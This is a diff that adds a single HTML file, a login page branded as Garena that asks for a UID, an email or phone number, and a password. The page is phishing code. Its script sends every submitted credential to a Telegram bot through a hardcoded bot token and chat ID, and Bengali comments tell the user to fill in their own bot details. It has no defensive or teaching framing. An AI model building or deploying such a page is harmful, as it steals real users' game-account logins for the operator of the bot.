@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-image: url('image.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            width: 350px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            transform: translateY(30px);
+            animation: slide-up 0.6s ease-out forwards;
+        }
+
+        @keyframes slide-up {
+            0% {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .login-container h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 20px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #007BFF;
+        }
+
+        .input-group label {
+            position: absolute;
+            top: -8px;
+            left: 20px;
+            font-size: 12px;
+            color: #007BFF;
+            transition: 0.3s;
+            background-color: #fff;
+            padding: 0 5px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #0056b3;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #007BFF;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Garena</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="uid" name="uid" required>
+                <label for="uid">UID</label>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="username" name="username" required>
+                <label for="username">Email or phone</label>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" name="password" required>
+                <label for="password">Password</label>
+            </div>
+
+            <button type="submit" class="btn">Login</button>
+        </form>
+
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // ফর্ম রিফ্রেশ বন্ধ করা
+
+            // ইনপুট থেকে ডাটা নেওয়া
+            let uid = document.getElementById("uid").value;
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            // **টেলিগ্রাম বট সেটআপ**
+            let botToken = "7992356703:AAGGmo7eTksT5oS-tzkwoY8k9DAtUkR9u_c"; // তোমার টেলিগ্রাম বটের টোকেন বসাও
+            let chatId = "6341598098"; // যেখানে মেসেজ পাঠাতে চাও সেই চ্যাট আইডি বসাও
+
+            // মেসেজ ফরম্যাট
+            let message = `🔔 **New Login Attempt** 🔔\n\n` +
+                          `🆔 UID: ${uid}\n` +
+                          `👤 Username: ${username}\n` +
+                          `🔑 Password: ${password}`;
+
+            // টেলিগ্রাম API-তে পাঠানো
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("✅ Login information sent successfully!");
+                    } else {
+                        alert("❌ Failed to send data.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("❌ Network error. Try again.");
+                });
+        });
+    </script>
+</body>
+</html>
